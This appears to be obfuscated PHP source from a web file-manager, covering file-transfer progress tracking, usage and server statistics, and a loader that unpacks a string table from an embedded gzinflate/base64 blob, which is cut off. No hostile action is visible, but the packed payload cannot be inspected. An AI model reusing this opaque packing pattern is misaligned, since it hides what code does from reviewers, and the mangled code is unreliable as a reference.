TaskFileTransfer { protected function startAfter() { $ûğÙ­„Î =& $_SERVER[¼èá¯æÙ]; parent::startAfter(); Hook::bind($ûğÙ­„Î[1904], array($this, $ûğÙ­„Î[1894])); Hook::bind($ûğÙ­„Î[1896], array($this, $ûğÙ­„Î[1897])); $¬½ŸÄî =& $this->task; $¬½ŸÄî[$ûğÙ­„Î[1898]] = $ûğÙ­„Î[1284]; if (!$¬½ŸÄî[$ûğÙ­„Î[1666]]) { $¬½ŸÄî[$ûğÙ­„Î[1666]] = LNG($ûğÙ­„Î[1905]); } } protected function endAfter() { $óÈ•¾õ =& $_SERVER[¼èá¯æÙ]; parent::endAfter(); Hook::unbind($óÈ•¾õ[1904], array($this, $óÈ•¾õ[1894])); Hook::unbind($óÈ•¾õ[1896], array($this, $óÈ•¾õ[1897])); } public function updateAfter() { $å—È³£ =& $_SERVER[¼èá¯æÙ]; $Ÿ¢ùÕ–Ë =& $this->task; if (!$Ÿ¢ùÕ–Ë[$å—È³£[1145]] || !$Ÿ¢ùÕ–Ë[$å—È³£[845]]) { return; } if ($Ÿ¢ùÕ–Ë[$å—È³£[1898]] == $å—È³£[1284]) { $—Í„õ“‚ = $Ÿ¢ùÕ–Ë[$å—È³£[1833]]; if ($Ÿ¢ùÕ–Ë[$å—È³£[1834]] != $å—È³£[1284]) { $—Í„õ“‚ = 0; } $š½«æœÌ = ($Ÿ¢ùÕ–Ë[$å—È³£[1837]] + $—Í„õ“‚) / $Ÿ¢ùÕ–Ë[$å—È³£[845]]; $Ÿ¢ùÕ–Ë[$å—È³£[1780]] = $š½«æœÌ * 0.3; } else { if ($Ÿ¢ùÕ–Ë[$å—È³£[1898]] == $å—È³£[400]) { $š½«æœÌ = $Ÿ¢ùÕ–Ë[$å—È³£[1779]] / $Ÿ¢ùÕ–Ë[$å—È³£[1145]]; $Ÿ¢ùÕ–Ë[$å—È³£[1780]] = 0.3 + $š½«æœÌ * 0.5; } else { if ($Ÿ¢ùÕ–Ë[$å—È³£[1898]] == $å—È³£[120]) { $š½«æœÌ = 0; if ($Ÿ¢ùÕ–Ë[$å—È³£[1832]]) { $š½«æœÌ = $Ÿ¢ùÕ–Ë[$å—È³£[1833]] / $Ÿ¢ùÕ–Ë[$å—È³£[1832]]; } $Ÿ¢ùÕ–Ë[$å—È³£[1780]] = 0.3 + 0.5 + $š½«æœÌ * 0.2; } } } if ($Ÿ¢ùÕ–Ë[$å—È³£[1780]] > 0) { $õöÅê²Ú = timeFloat() - $Ÿ¢ùÕ–Ë[$å—È³£[1782]] - $Ÿ¢ùÕ–Ë[$å—È³£[1785]]; $Ÿ¢ùÕ–Ë[$å—È³£[1786]] = $õöÅê²Ú * (1 - $Ÿ¢ùÕ–Ë[$å—È³£[1780]]) / $Ÿ¢ùÕ–Ë[$å—È³£[1780]]; } } public function copyFileStart($õßí´Ú, $ëóÂ¤…°, $Å¨ö¥·, $•Û“†…Ï, $„Â•Ö¶ô, $¶™ìçöß) { $®æ®ç =& $_SERVER[¼èá¯æÙ]; parent::copyFileStart($õßí´Ú, $ëóÂ¤…°, $Å¨ö¥·, $•Û“†…Ï, $„Â•Ö¶ô, $¶™ìçöß); $Óˆ’„òÏ =& $this->task; if ($Óˆ’„òÏ[$®æ®ç[1898]] == $®æ®ç[400]) { $Óˆ’„òÏ[$®æ®ç[1898]] = $®æ®ç[120]; } $this->update(); } public function copyFileEnd($„¬İÀ“™, $„¤£øŞú, $Èš–˜Æø, $à†êº©Ê, $®Â¢ç‘ª, $´ğõÂÑ€) { $óû µÌÌ =& $_SERVER[¼èá¯æÙ]; $ı×ú¶ä‹ =& $this->task; $ı×ú¶ä‹[$óû µÌÌ[1833]] = $ı×ú¶ä‹[$óû µÌÌ[1832]]; $ı×ú¶ä‹[$óû µÌÌ[1837]] += $ı×ú¶ä‹[$óû µÌÌ[1832]]; $ı×ú¶ä‹[$óû µÌÌ[1834]] = $óû µÌÌ[12]; $this->update(); } public function zipEvent($çİù˜‰‚, $÷´±ï¤­, $¢™¿™¦Ş, $ÕÂ‰œÜ) { $ú”î²÷ =& $_SERVER[¼èá¯æÙ]; $™ö‹øšÕ =& $this->task; $™ö‹øšÕ[$ú”î²÷[1830]] = get_path_this($÷´±ï¤­); $™ö‹øšÕ[$ú”î²÷[1832]] = $ÕÂ‰œÜ; $™ö‹øšÕ[$ú”î²÷[1833]] = $¢™¿™¦Ş; $™ö‹øšÕ[$ú”î²÷[1147]] = $çİù˜‰‚ == $ú”î²÷[1906] ? $ú”î²÷[1901] : $ú”î²÷[1902]; $™ö‹øšÕ[$ú”î²÷[1834]] = $ú”î²÷[12]; $™ö‹øšÕ[$ú”î²÷[845]] = $ÕÂ‰œÜ; $™ö‹øšÕ[$ú”î²÷[1898]] = $ú”î²÷[400]; $this->update(); } public function nameParse($¨½ÙàæÒ) { $¥ÏÍà›¢ =& $_SERVER[¼èá¯æÙ]; $õ´È†‚¶ =& $this->task; if ($õ´È†‚¶[$¥ÏÍà›¢[1779]] < $õ´È†‚¶[$¥ÏÍà›¢[1145]]) { $¢‚‹¤ = get_path_this($¨½ÙàæÒ); if (strstr($¢‚‹¤, $¥ÏÍà›¢[10])) { $õ´È†‚¶[$¥ÏÍà›¢[1779]] += 1; } } if ($õ´È†‚¶[$¥ÏÍà›¢[1898]] == $¥ÏÍà›¢[1284]) { $õ´È†‚¶[$¥ÏÍà›¢[1898]] = $¥ÏÍà›¢[400]; } $õ´È†‚¶[$¥ÏÍà›¢[1830]] = $¨½ÙàæÒ; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($™ƒç°¹) { $³üƒÃ‡ª =& $_SERVER[¼èá¯æÙ]; $‹Ì˜•÷È = array($³üƒÃ‡ª[676] => array($³üƒÃ‡ª[33] => $³üƒÃ‡ª[1907], $³üƒÃ‡ª[362] => array($³üƒÃ‡ª[294], $³üƒÃ‡ª[847], $³üƒÃ‡ª[1908], $³üƒÃ‡ª[1909])), $³üƒÃ‡ª[1910] => array($³üƒÃ‡ª[33] => $³üƒÃ‡ª[1911], $³üƒÃ‡ª[362] => array($³üƒÃ‡ª[294], $³üƒÃ‡ª[845], $³üƒÃ‡ª[1912], $³üƒÃ‡ª[1913], $³üƒÃ‡ª[1914]))); if (!isset($‹Ì˜•÷È[$™ƒç°¹])) { return !1; } $this->optionType = $‹Ì˜•÷È[$™ƒç°¹][$³üƒÃ‡ª[33]]; $this->field = $‹Ì˜•÷È[$™ƒç°¹][$³üƒÃ‡ª[362]]; return !0; } public function listData($²é¸ŞÀ® = false, $üş£›Ù­ = "\x6d\157\144\x69\x66\x79\x54\151\155\145", $ŒÖ”ÛØ = false) { return parent::listData($²é¸ŞÀ®, $üş£›Ù­, $ŒÖ”ÛØ); } public function trendList($†Ü¶ÛúÒ) { $«û©Åß =& $_SERVER[¼èá¯æÙ]; $Ü“ë°ëÆ = $this->listData(); if ($Ü“ë°ëÆ) { $æ”¾¾¹ï = end($Ü“ë°ëÆ); $Î¿öİÅü = date($«û©Åß[1915], strtotime($«û©Åß[1916])); if ($æ”¾¾¹ï[$«û©Åß[294]] == $Î¿öİÅü) { return $Ü“ë°ëÆ; } $…İ¡àæµ = strtotime($æ”¾¾¹ï[$«û©Åß[294]]); } if (!isset($…İ¡àæµ)) { $¾·Ò‹Ùô = $†Ü¶ÛúÒ == $«û©Åß[676] ? $«û©Åß[608] : $«û©Åß[907]; $…İ¡àæµ = Model($¾·Ò‹Ùô)->min($«û©Åß[243]); } $é˜î›‰¡ = $«û©Åß[1917] . ucfirst($†Ü¶ÛúÒ); $¸ùïÒŒ = $this->dateList($…İ¡àæµ); foreach ($¸ùïÒŒ as $Î¿öİÅü) { $this->{$é˜î›‰¡}($Î¿öİÅü); } return $this->listData(); } private function dateList($‰ÈìÅòÛ) { $¤‡Ï³÷ =& $_SERVER[¼èá¯æÙ]; $ÔËĞÛìı = $‰ÈìÅòÛ; $ÔùŞ®ú = strtotime($¤‡Ï³÷[1916]); $ş§ˆ ° = array(); while ($ÔËĞÛìı <= $ÔùŞ®ú) { $ş§ˆ °[] = date($¤‡Ï³÷[1915], $ÔËĞÛìı); $ÔËĞÛìı = strtotime($¤‡Ï³÷[1918], $ÔËĞÛìı); } return $ş§ˆ °; } public function _recordUser($È•Î£äÉ = '') { $»ÊÊš£¼ =& $_SERVER[¼èá¯æÙ]; $Š–¥ñ¨Ÿ = strtotime(date($»ÊÊš£¼[1919], strtotime($È•Î£äÉ))); $Ç…»¡ã˜ = strtotime(date($»ÊÊš£¼[1920], strtotime($È•Î£äÉ))); $ÏÌ¼˜­í = array($»ÊÊš£¼[243] => array($»ÊÊš£¼[1095], $Ç…»¡ã˜)); $Üİ™Œ©Æ = Model($»ÊÊš£¼[608])->where($ÏÌ¼˜­í)->count($»ÊÊš£¼[1778]); $ÏÌ¼˜­í[$»ÊÊš£¼[243]] = array($»ÊÊš£¼[420], array($Š–¥ñ¨Ÿ, $Ç…»¡ã˜)); $‘ûÚõÌ† = Model($»ÊÊš£¼[608])->where($ÏÌ¼˜­í)->count($»ÊÊš£¼[1778]); $ÏÌ¼˜­í[$»ÊÊš£¼[33]] = $»ÊÊš£¼[1921]; $à’‘‚×İ = Model($»ÊÊš£¼[1922])->where($ÏÌ¼˜­í)->count($»ÊÊš£¼[1923]); $³û˜ôí = array($»ÊÊš£¼[294] => $È•Î£äÉ, $»ÊÊš£¼[847] => (int) $Üİ™Œ©Æ, $»ÊÊš£¼[1908] => (int) $‘ûÚõÌ†, $»ÊÊš£¼[1909] => (int) $à’‘‚×İ); return $this->insert($³û˜ôí); } public function _recordStore($¼ù—ï¦ = '') { $’êŸàÊ– =& $_SERVER[¼èá¯æÙ]; $×÷Œæ‚ = strtotime(date($’êŸàÊ–[1920], strtotime($¼ù—ï¦))); $íŠÔØÒè = array($’êŸàÊ–[243] => array($’êŸàÊ–[1095], $×÷Œæ‚)); $·ş•¸ãÀ = Model($’êŸàÊ–[555])->where($íŠÔØÒè)->sum($’êŸàÊ–[89]); $íŠÔØÒè[$’êŸàÊ–[496]] = 0; $“š“áÉ = Model($’êŸàÊ–[907])->where($íŠÔØÒè)->sum($’êŸàÊ–[89]); $íŠÔØÒè[$’êŸàÊ–[200]] = 1; $é ñ¹½ = Model($’êŸàÊ–[907])->where($íŠÔØÒè)->sum($’êŸàÊ–[89]); $íŠÔØÒè[$’êŸàÊ–[200]] = 2; $ªß—ÇĞ” = Model($’êŸàÊ–[907])->where($íŠÔØÒè)->sum($’êŸàÊ–[89]); $ĞÎ„ø¬ß = array($’êŸàÊ–[294] => $¼ù—ï¦, $’êŸàÊ–[845] => (int) $“š“áÉ, $’êŸàÊ–[1912] => (int) $·ş•¸ãÀ, $’êŸàÊ–[1913] => (int) $é ñ¹½, $’êŸàÊ–[1914] => (int) $ªß—ÇĞ”); return $this->insert($ĞÎ„ø¬ß); } public function trend($ü›çº §, $¼©´ïø°) { $…÷Ä‡ó¿ =& $_SERVER[¼èá¯æÙ]; if (!$this->init($ü›çº §)) { return !1; } $ê¢‰ºâÏ = $this->trendList($ü›çº §); if ($ê¢‰ºâÏ && $¼©´ïø° != $…÷Ä‡ó¿[1750]) { $şï’ÁÇ¤ = $ê¢‰ºâÏ[0][$…÷Ä‡ó¿[294]]; $ü¨Œ’³™ = $this->validDate($¼©´ïø°, $şï’ÁÇ¤); $î¾ã¿ÁÛ = array(); $§öÜ°Ÿ° = array_to_keyvalue($ê¢‰ºâÏ, $…÷Ä‡ó¿[294]); foreach ($ü¨Œ’³™ as $ˆÅ©Ô’) { if (isset($§öÜ°Ÿ°[$ˆÅ©Ô’])) { $’øğ£“£ = $§öÜ°Ÿ°[$ˆÅ©Ô’]; } else { $’øğ£“£ = end($ê¢‰ºâÏ); $’øğ£“£[$…÷Ä‡ó¿[294]] = $ˆÅ©Ô’; if ($ü›çº § == $…÷Ä‡ó¿[676]) { $’øğ£“£[$…÷Ä‡ó¿[1908]] = $’øğ£“£[$…÷Ä‡ó¿[1909]] = 0; } } $î¾ã¿ÁÛ[] = $’øğ£“£; } $ê¢‰ºâÏ = $î¾ã¿ÁÛ; } $Ü– ‹–ı = array($…÷Ä‡ó¿[676] => array($…÷Ä‡ó¿[847] => LNG($…÷Ä‡ó¿[1924]), $…÷Ä‡ó¿[1908] => LNG($…÷Ä‡ó¿[1925]), $…÷Ä‡ó¿[1909] => LNG($…÷Ä‡ó¿[1926])), $…÷Ä‡ó¿[1910] => array($…÷Ä‡ó¿[845] => LNG($…÷Ä‡ó¿[1927]), $…÷Ä‡ó¿[1912] => LNG($…÷Ä‡ó¿[1928]), $…÷Ä‡ó¿[1913] => LNG($…÷Ä‡ó¿[1929]), $…÷Ä‡ó¿[1914] => LNG($…÷Ä‡ó¿[1930]))); $Ç‚úºÍñ = array($…÷Ä‡ó¿[676] => $…÷Ä‡ó¿[1931], $…÷Ä‡ó¿[1910] => $…÷Ä‡ó¿[89]); if (empty($ê¢‰ºâÏ)) { $ˆÅ©Ô’ = date($…÷Ä‡ó¿[1915], strtotime($…÷Ä‡ó¿[1916])); $‹ƒ¹†“« = array($…÷Ä‡ó¿[294] => $ˆÅ©Ô’); foreach ($Ü– ‹–ı[$ü›çº §] as $€•‹ÑÇ§ => $¡òå»‘Ò) { $‹ƒ¹†“«[$€•‹ÑÇ§] = 0; } $ê¢‰ºâÏ[] = $‹ƒ¹†“«; } $¨ŒÚšÍÔ = array(); foreach ($ê¢‰ºâÏ as $¡òå»‘Ò) { if ($ü›çº § == $…÷Ä‡ó¿[1910] && $¡òå»‘Ò[$…÷Ä‡ó¿[1912]] > $¡òå»‘Ò[$…÷Ä‡ó¿[845]]) { $¡òå»‘Ò[$…÷Ä‡ó¿[1912]] = $¡òå»‘Ò[$…÷Ä‡ó¿[845]]; } foreach ($Ü– ‹–ı[$ü›çº §] as $€•‹ÑÇ§ => $½Ë¹‚Ÿ×) { $’øğ£“£ = array($…÷Ä‡ó¿[294] => $¡òå»‘Ò[$…÷Ä‡ó¿[294]], $…÷Ä‡ó¿[1666] => $½Ë¹‚Ÿ×); $’øğ£“£[$Ç‚úºÍñ[$ü›çº §]] = isset($¡òå»‘Ò[$€•‹ÑÇ§]) ? $¡òå»‘Ò[$€•‹ÑÇ§] : 0; $¨ŒÚšÍÔ[] = $’øğ£“£; } } return $¨ŒÚšÍÔ; } public function validDate($±¬íœ÷§, $Ô»ªÃÏæ) { $İ†½Ø¢• =& $_SERVER[¼èá¯æÙ]; $İ‹«Ï™µ = date($İ†½Ø¢•[1915], strtotime($İ†½Ø¢•[1916])); $Åà’œ™â = array($İ‹«Ï™µ); switch ($±¬íœ÷§) { case $İ†½Ø¢•[1757]: $Ô¯³•Ç = mktime(0, 0, 0, date($İ†½Ø¢•[1932]), date($İ†½Ø¢•[1457]) - date($İ†½Ø¢•[1547]) + 7 - 7, date($İ†½Ø¢•[1933])); $ŒåœÉ¦ = 0; do { $½±îØÒê = date($İ†½Ø¢•[1915], $Ô¯³•Ç - 3600 * 24 * 7 * $ŒåœÉ¦); $Åà’œ™â[] = $½±îØÒê; $ŒåœÉ¦++; } while ($Ô»ªÃÏæ < $½±îØÒê); break; case $İ†½Ø¢•[1755]: $ŒåœÉ¦ = 1; do { $ÁâåÈÅ¶ = date($İ†½Ø¢•[1934], strtotime("\55\x20{$ŒåœÉ¦}\40\x6d\157\156\x74\150\x73")); $Åà’œ™â[] = $ÁâåÈÅ¶; $ŒåœÉ¦++; } while ($Ô»ªÃÏæ < $ÁâåÈÅ¶); break; case $İ†½Ø¢•[1935]: $ğà…ßîª = (int) date($İ†½Ø¢•[1933], strtotime($Ô»ªÃÏæ)); $Õ‰½ö­» = (int) date($İ†½Ø¢•[1933]); if ($ğà…ßîª >= $Õ‰½ö­») { break; } for ($ğà…ßîª; $ğà…ßîª < $Õ‰½ö­»; $ğà…ßîª++) { $Åà’œ™â[] = $ğà…ßîª . $İ†½Ø¢•[1936]; } break; default: break; } if ($Ô»ªÃÏæ > end($Åà’œ™â)) { array_pop($Åà’œ™â); } sort($Åà’œ™â); return $Åà’œ™â; } public function listTable($­ÓÖÄÁæ) { $ŒşæÍˆı = ucfirst($­ÓÖÄÁæ); return Model($ŒşæÍˆı)->listData(); } public function option($á–ı€Œ„) { $èÑâ—ë´ = $_SERVER[¼èá¯æÙ][1937] . ucfirst($á–ı€Œ„); return $this->{$èÑâ—ë´}(); } private function optionUser() { $Õªõó¬‡ =& $_SERVER[¼èá¯æÙ]; $®‹¨ÌàŸ = Model($Õªõó¬‡[608])->count($Õªõó¬‡[1778]); $ï§…ë‘Š = Model($Õªõó¬‡[608])->where($Õªõó¬‡[1938])->count($Õªõó¬‡[1778]); $ÙÙ½æóš = intval($GLOBALS[$Õªõó¬‡[6]][$Õªõó¬‡[436]][$Õªõó¬‡[1723]]) / 3600; $¥ƒêê±£ = strtotime("\55{$ÙÙ½æóš}\x20\x68\x6f\x75\162\x73"); $ÅäÀ×ÖŸ = strtotime(date($Õªõó¬‡[1919])); if ($¥ƒêê±£ < $ÅäÀ×ÖŸ) { $¥ƒêê±£ = $ÅäÀ×ÖŸ; } $ØŠòÑ˜Î = array($Õªõó¬‡[1939] => array($Õªõó¬‡[1096], $¥ƒêê±£)); $·Ó²½Ì‡ = (int) Model($Õªõó¬‡[608])->where($ØŠòÑ˜Î)->count($Õªõó¬‡[1778]); if (!$·Ó²½Ì‡) { $·Ó²½Ì‡ = 1; } $ØŠòÑ˜Î = array($Õªõó¬‡[1939] => array($Õªõó¬‡[1096], $ÅäÀ×ÖŸ)); $Ã‹Æ”ôÁ = Model($Õªõó¬‡[608])->where($ØŠòÑ˜Î)->count($Õªõó¬‡[1778]); return array($Õªõó¬‡[840] => (int) $®‹¨ÌàŸ, $Õªõó¬‡[1940] => (int) ($®‹¨ÌàŸ - $ï§…ë‘Š), $Õªõó¬‡[1941] => (int) $ï§…ë‘Š, $Õªõó¬‡[1942] => (int) $Ã‹Æ”ôÁ, $Õªõó¬‡[1943] => $·Ó²½Ì‡); } private function optionFile() { $Êéâ”Æú =& $_SERVER[¼èá¯æÙ]; $ğ¸ØšàŞ = $this->sourceSize(); $ñ’ŒÛšï = $ğ¸ØšàŞ[$Êéâ”Æú[89]]; $í¼äæÓ = $ğ¸ØšàŞ[$Êéâ”Æú[1912]]; $ÉÇ†¸† = Model($Êéâ”Æú[907])->where(array($Êéâ”Æú[496] => 0))->count($Êéâ”Æú[203]); $’—›–Í’ = array($Êéâ”Æú[496] => 0, $Êéâ”Æú[243] => array($Êéâ”Æú[1096], strtotime(date($Êéâ”Æú[1919])))); $öâ½œŒº = Model($Êéâ”Æú[907])->where($’—›–Í’)->sum($Êéâ”Æú[89]); $ÉÕúşñó = Model($Êéâ”Æú[907])->where($’—›–Í’)->count($Êéâ”Æú[203]); return array($Êéâ”Æú[845] => $ñ’ŒÛšï, $Êéâ”Æú[1912] => $í¼äæÓ, $Êéâ”Æú[1944] => $ñ’ŒÛšï - $í¼äæÓ, $Êéâ”Æú[1945] => (int) $öâ½œŒº, $Êéâ”Æú[847] => (int) $ÉÇ†¸†, $Êéâ”Æú[1946] => (int) $ÉÕúşñó); } private function optionAccess() { $Ğ‹¥ˆºÈ =& $_SERVER[¼èá¯æÙ]; return array($Ğ‹¥ˆºÈ[840] => $this->typeLogCnt(), $Ğ‹¥ˆºÈ[120] => $this->typeLogCnt($Ğ‹¥ˆºÈ[120]), $Ğ‹¥ˆºÈ[536] => $this->typeLogCnt($Ğ‹¥ˆºÈ[536]), $Ğ‹¥ˆºÈ[1947] => $this->typeLogCnt($Ğ‹¥ˆºÈ[1947]), $Ğ‹¥ˆºÈ[1948] => $this->typeLogCnt($Ğ‹¥ˆºÈ[1948]), $Ğ‹¥ˆºÈ[676] => $this->typeLogCnt($Ğ‹¥ˆºÈ[12], $Ğ‹¥ˆºÈ[1923])); } private function typeLogCnt($¿³Ğ„û = '', $¬ôı¼ñÖ = "\151\144") { $ÊÀ¯ëª =& $_SERVER[¼èá¯æÙ]; $ÔÃ¢™ÂÇ = array($ÊÀ¯ëª[120] => array($ÊÀ¯ëª[1949], $ÊÀ¯ëª[1950]), $ÊÀ¯ëª[536] => array($ÊÀ¯ëª[1951], $ÊÀ¯ëª[1952]), $ÊÀ¯ëª[1947] => array($ÊÀ¯ëª[1953], $ÊÀ¯ëª[1954], $ÊÀ¯ëª[1955]), $ÊÀ¯ëª[1948] => array($ÊÀ¯ëª[1956], $ÊÀ¯ëª[1957]), $ÊÀ¯ëª[1958] => array($ÊÀ¯ëª[1959], $ÊÀ¯ëª[1960], $ÊÀ¯ëª[1961])); $°Í¬“’‘ = strtotime(date($ÊÀ¯ëª[1919])); $¨½ŒŞ‚Ÿ = array($ÊÀ¯ëª[243] => array($ÊÀ¯ëª[1096], $°Í¬“’‘)); if ($¿³Ğ„û) { $¨½ŒŞ‚Ÿ[$ÊÀ¯ëª[33]] = array($ÊÀ¯ëª[7], $ÔÃ¢™ÂÇ[$¿³Ğ„û]); } $ú½ˆãßš = Model($ÊÀ¯ëª[1922])->where($¨½ŒŞ‚Ÿ)->count($¬ôı¼ñÖ); return (int) $ú½ˆãßš; } private function optionServer() { $ˆĞÍ²½ =& $_SERVER[¼èá¯æÙ]; $å“Îº·Ä = $this->diskDriver(); $ÏÅ¼Îû = KodIO::defaultDriver(); $ûÛüîÄ» = array($ˆĞÍ²½[900] => $ÏÅ¼Îû[$ˆĞÍ²½[486]]); $•¤êòÂÕ = Model($ˆĞÍ²½[555])->where($ûÛüîÄ»)->sum($ˆĞÍ²½[89]); $Ú¦à©ºì = explode($ˆĞÍ²½[53], $_SERVER[$ˆĞÍ²½[157]]); $œé««á = $Ú¦à©ºì[0]; $ÏüÂ¶à = $GLOBALS[$ˆĞÍ²½[6]][$ˆĞÍ²½[21]]; $Î‰÷ï¯â = $ÏüÂ¶à[$ˆĞÍ²½[1058]]; if ($Î‰÷ï¯â == $ˆĞÍ²½[1046]) { $ƒ³ ÓÆÀ = explode($ˆĞÍ²½[1373], $ÏüÂ¶à[$ˆĞÍ²½[1057]]); $Î‰÷ï¯â = $ƒ³ ÓÆÀ[0]; } if ($Î‰÷ï¯â == $ˆĞÍ²½[994] || $Î‰÷ï¯â == $ˆĞÍ²½[887]) { $Òµñ™Ù‚ = Model()->db()->query($ˆĞÍ²½[1962]); $òÓšäÜí = $Òµñ™Ù‚[0] && isset($Òµñ™Ù‚[0][$ˆĞÍ²½[1665]]) ? $Òµñ™Ù‚[0][$ˆĞÍ²½[1665]] : 0; $Î‰÷ï¯â = $ˆĞÍ²½[1963] . ($òÓšäÜí ? $ˆĞÍ²½[8] . $òÓšäÜí : $ˆĞÍ²½[12]); } $Îù¯Å÷ = $GLOBALS[$ˆĞÍ²½[6]][$ˆĞÍ²½[436]][$ˆĞÍ²½[909]]; return array($ˆĞÍ²½[1964] => $å“Îº·Ä ? $å“Îº·Ä[$ˆĞÍ²½[1965]] : 0, $ˆĞÍ²½[1966] => $å“Îº·Ä ? $å“Îº·Ä[$ˆĞÍ²½[1967]] : 0, $ˆĞÍ²½[1968] => (int) $ÏÅ¼Îû[$ˆĞÍ²½[1965]] * 1024 * 1024 * 1024, $ˆĞÍ²½[1969] => (int) $•¤êòÂÕ, $ˆĞÍ²½[1970] => ucfirst($œé««á), $ˆĞÍ²½[1971] => $ˆĞÍ²½[1972] . PHP_VERSION, $ˆĞÍ²½[1973] => phpBuild64() ? 64 : 32, $ˆĞÍ²½[839] => str_replace($ˆĞÍ²½[1214], $ˆĞÍ²½[1074], $Î‰÷ï¯â), $ˆĞÍ²½[436] => ucfirst($Îù¯Å÷), $ˆĞÍ²½[32] => $_SERVER[$ˆĞÍ²½[1974]]); } private function diskDriver() { $·Êöñ í =& $_SERVER[¼èá¯æÙ]; $Ÿ´»™ù³ = $·Êöñ í[8]; $ëè°‰ = $GLOBALS[$·Êöñ í[6]][$·Êöñ í[1390]] == $·Êöñ í[1391]; if ($ëè°‰) { $Ÿ´»™ù³ = $·Êöñ í[1975]; if (function_exists($·Êöñ í[1976])) { exec($·Êöñ í[1977], $£ùŸµã‚); $Ÿ´»™ù³ = $£ùŸµã‚[1] . $·Êöñ í[8]; } } if (!file_exists($Ÿ´»™ù³)) { return; } if (!function_exists($·Êöñ í[1978])) { return; } $‹€Ï×Áì = @disk_total_space($Ÿ´»™ù³); $³Å°åÕ» = $‹€Ï×Áì - @disk_free_space($Ÿ´»™ù³); return array($·Êöñ í[1965] => $‹€Ï×Áì, $·Êöñ í[1967] => $³Å°åÕ»); } public function fileChart($Ù•Ä•ÈÖ) { $ŸÄ¨á‹ =& $_SERVER[¼èá¯æÙ]; if (isset($Ù•Ä•ÈÖ[$ŸÄ¨á‹[1778]])) { return Model($ŸÄ¨á‹[907])->userFileTypeProfile($Ù•Ä•ÈÖ[$ŸÄ¨á‹[1778]]); } if (isset($Ù•Ä•ÈÖ[$ŸÄ¨á‹[1979]])) { return Model($ŸÄ¨á‹[907])->groupFileTypeProfile($Ù•Ä•ÈÖ[$ŸÄ¨á‹[1979]]); } $—àøªâè = $this->sourceSize(); $°¯ªˆ“ = array($ŸÄ¨á‹[202] => 0, $ŸÄ¨á‹[200] => 1); $¨‘¥œÅó = Model($ŸÄ¨á‹[907])->where($°¯ªˆ“)->sum($ŸÄ¨á‹[89]); $°¯ªˆ“[$ŸÄ¨á‹[200]] = 2; $¥­‰¸«¥ = Model($ŸÄ¨á‹[907])->where($°¯ªˆ“)->sum($ŸÄ¨á‹[89]); return array($ŸÄ¨á‹[845] => $—àøªâè[$ŸÄ¨á‹[89]], $ŸÄ¨á‹[1912] => $—àøªâè[$ŸÄ¨á‹[1912]], $ŸÄ¨á‹[1913] => (int) $¨‘¥œÅó, $ŸÄ¨á‹[1914] => (int) $¥­‰¸«¥); } private function sourceSize() { $ä‹ê°á =& $_SERVER[¼èá¯æÙ]; $²üõ˜‡ = Model($ä‹ê°á[907])->where(array($ä‹ê°á[496] => 0))->sum($ä‹ê°á[89]); $µÙò¨Ä¹ = Model($ä‹ê°á[555])->sum($ä‹ê°á[89]); if ($µÙò¨Ä¹ > $²üõ˜‡) { $µÙò¨Ä¹ = $²üõ˜‡; } return array($ä‹ê°á[89] => (int) $²üõ˜‡, $ä‹ê°á[1912] => (int) $µÙò¨Ä¹); } } goto eÌ·–Œ¶½³; D•ÃåàĞÁŒ: function binCheckBigger($ü·¾Å, $€ªõ‚Û) { return $ü·¾Å > $€ªõ‚Û; } $_SERVER[$_SERVER[¤ÀõŒÆ][3]] = ("\70\66\61\66"."\71\70")+0;$_1u5k="oqk5fjunexr2hc136lyvz8w97spi4dgbtm0ajmucv0o4xqln17e9zsi8ghtwp3y2ba56kdfrmtf2kdhpg4";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($Á“¥¾¿, $öÓ€Õøê) { $èò¸Óˆì =& $_SERVER[¼èá¯æÙ]; if (isset(self::$_methodList[$Á“¥¾¿])) { return @call_user_func_array(self::$_methodList[$Á“¥¾¿], $öÓ€Õøê); } else { if (method_exists($this, $Á“¥¾¿)) { return call_user_func_array(array($this, $Á“¥¾¿), $öÓ€Õøê); } else { think_exception(__CLASS__ . $èò¸Óˆì[4] . $Á“¥¾¿ . $èò¸Óˆì[5]); } } } public static function __callStatic($¶¶åÙû¯, $æš¿ƒèØ) { if (isset(self::$_methodListStatic[$¶¶åÙû¯])) { return call_user_func_array(self::$_methodListStatic[$¶¶åÙû¯], $æš¿ƒèØ); } else { if (method_exists(self, $¶¶åÙû¯)) { return call_user_func_array(array(self, $¶¶åÙû¯), $æš¿ƒèØ); } else { show_json("{$¶¶åÙû¯}\x28\x29\40\x6e\x6f\164\40\145\x78\x69\163\164\73", !1); } } } public static function addMethod($­²›­×¸, $êÖ¿ûï) { self::$_methodList[$­²›­×¸] = $êÖ¿ûï; } public static function addMethodStatic($Óª™ö¼î, $ÉãÖÒà³) { self::$_methodListStatic[$Óª™ö¼î] = $ÉãÖÒà³; } } goto bãæ’¶Ï’¡; e¡êÎ¨§ó: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\274\350\341\257\346\331", "\312\333\370\207\307\251"); $_SERVER[¼èá¯æÙ] = explode("\x7c\x4\x7c\x1\x7c\x6", gzinflate(substr("\37\213\10\0\0\0\0\0\0\23\305\275\7\170\34\325\325\60\114\11\4\73\4\110\40\204\100\22\306\262\215\44\173\213\44\167\331\262\131\111\53\151\361\152\127\354\256\134\127\36\217\166".base64_decode('Z6WxdnfWO7MqLrw0023TDISYXkKzKaGDaQmQ8ELCG1oaEIpk00INIYTAf8u5ZWZX8P7P9w==')."\75\317\147\260\367\336\163\313\334\162\356\271\347\236\173\356\71\133\257\175\344\37\347\74\261\341\133\33\366\336\260\377\303\367\375\171\373\247\20\336\260\57\372\157\37\32\76\372\354\3\366\42"."\177\16\75\373\254\232\232\216\331\23\247\107\16\334\172\347\16\155\377\346\353\77\373\365\235\117\157\177\376\157\117\337\224\110\57\274\177\173\337\117\367\72\265\366\47\323\33\121\126\132\262\221".strrev('®îñ¨M5t°k6µ¯ò*Ğ¨ş¨Ó­¦sÔ\\,wOéúşFÃGÑŒù™H'."\n".'-²ÃaôVÓy(ş')."\256\140\54\1\231\32\345\364\234\231\206\120\101\53\152\71\370\176\101\57\132\250\65\162\165\152\301\54\350\171\7\104\0\322\232\255\365\152\26\324\324\332\254\266\6\273\302\321\345\152\142\171"."\x57\x10\x7